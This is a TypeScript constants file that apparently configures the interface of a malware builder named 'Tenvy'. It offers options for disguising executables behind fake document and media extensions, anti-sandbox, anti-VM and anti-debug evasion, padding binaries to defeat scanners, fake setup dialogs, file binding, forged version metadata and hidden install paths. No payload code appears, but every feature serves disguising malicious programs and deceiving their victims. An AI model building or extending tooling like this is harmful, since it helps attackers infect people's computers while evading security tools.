export const TARGET_OS_OPTIONS = [
	{ value: 'windows', label: 'Windows' },
	{ value: 'linux', label: 'Linux' },
	{ value: 'darwin', label: 'macOS' }
] as const;

export type TargetOS = (typeof TARGET_OS_OPTIONS)[number]['value'];

export const EXTENSION_OPTIONS_BY_OS: Record<TargetOS, readonly string[]> = {
	windows: ['.exe', '.msi', '.bat', '.scr', '.com', '.ps1'],
	linux: ['.bin', '.run', '.sh'],
	darwin: ['.bin', '.pkg', '.app']
} as const;

export type TargetArch = 'amd64' | '386' | 'arm64';

export const ARCHITECTURE_OPTIONS_BY_OS: Record<
	TargetOS,
	readonly { value: TargetArch; label: string }[]
> = {
	windows: [
		{ value: 'amd64', label: 'x64' },
		{ value: '386', label: 'x86' },
		{ value: 'arm64', label: 'ARM64' }
	],
	linux: [
		{ value: 'amd64', label: 'x64' },
		{ value: 'arm64', label: 'ARM64' }
	],
	darwin: [
		{ value: 'amd64', label: 'Intel (x64)' },
		{ value: 'arm64', label: 'Apple Silicon (ARM64)' }
	]
} as const;

export const EXTENSION_SPOOF_PRESETS = [
	'.jpg',
	'.png',
	'.msi',
	'.pdf',
	'.docx',
	'.xlsx',
	'.pptx',
	'.zip',
	'.mp3',
	'.mp4'
] as const;

export type ExtensionSpoofPreset = (typeof EXTENSION_SPOOF_PRESETS)[number];

export const SPLASH_LAYOUT_OPTIONS = [
	{ value: 'center', label: 'Centered' },
	{ value: 'split', label: 'Split accent' }
] as const;

export type SplashLayout = (typeof SPLASH_LAYOUT_OPTIONS)[number]['value'];

export const DEFAULT_SPLASH_SCREEN = {
	title: 'Preparing setup',
	subtitle: 'Initializing components',
	message: 'Please wait while we ready the installer.',
	background: '#0f172a',
	accent: '#22d3ee',
	text: '#f8fafc',
	layout: 'center' as SplashLayout
} as const;

export const DEFAULT_FILE_INFORMATION = {
	fileDescription: '',
	productName: '',
	companyName: '',
	productVersion: '',
	fileVersion: '',
	originalFilename: '',
	internalName: '',
	legalCopyright: ''
} as const;

export const ANTI_TAMPER_BADGES = ['Anti-Sandbox', 'Anti-VM', 'Anti-Debug'] as const;

export const INSTALLATION_PATH_PRESETS = [
	{ label: '%AppData%\\Tenvy', value: '%AppData%\\Tenvy' },
	{ label: '%USERPROFILE%\\Tenvy', value: '%USERPROFILE%\\Tenvy' },
	{ label: '~/.config/tenvy', value: '~/.config/tenvy' }
] as const;

export const FILE_PUMPER_UNITS = ['KB', 'MB', 'GB'] as const;

export type FilePumperUnit = (typeof FILE_PUMPER_UNITS)[number];

export const FILE_PUMPER_UNIT_TO_BYTES: Record<FilePumperUnit, number> = {
	KB: 1024,
	MB: 1024 * 1024,
	GB: 1024 * 1024 * 1024
};

export const MAX_FILE_PUMPER_BYTES = 10 * 1024 * 1024 * 1024; // 10 GiB ceiling for padded binaries

export const FAKE_DIALOG_OPTIONS = [
	{ value: 'none', label: 'Disabled' },
	{ value: 'error', label: 'Error dialog' },
	{ value: 'warning', label: 'Warning dialog' },
	{ value: 'info', label: 'Information dialog' }
] as const;

export type FakeDialogType = (typeof FAKE_DIALOG_OPTIONS)[number]['value'];

export const FAKE_DIALOG_DEFAULTS: Record<
	Exclude<FakeDialogType, 'none'>,
	{ title: string; message: string }
> = {
	error: {
		title: 'Setup Error',
		message: 'An unexpected error occurred while installing the application.'
	},
	warning: {
		title: 'Setup Warning',
		message: 'Review the installation requirements before continuing.'
	},
	info: {
		title: 'Setup Complete',
		message: 'The installation finished successfully.'
	}
} as const;

export type Endpoint = { host: string; port: string };
export type HeaderKV = { key: string; value: string };
export type CookieKV = { name: string; value: string };

export const INPUT_FIELD_CLASSES =
	'flex h-9 w-full min-w-0 rounded-md border border-input bg-background px-3 py-1 text-base shadow-xs ring-offset-background transition-[color,box-shadow] outline-none selection:bg-primary selection:text-primary-foreground placeholder:text-muted-foreground disabled:cursor-not-allowed disabled:opacity-50 md:text-sm dark:bg-input/30 focus-visible:border-ring focus-visible:ring-[3px] focus-visible:ring-ring/50 aria-invalid:border-destructive aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40';

export const BINDER_SIZE_LIMIT_BYTES = 50 * 1024 * 1024;
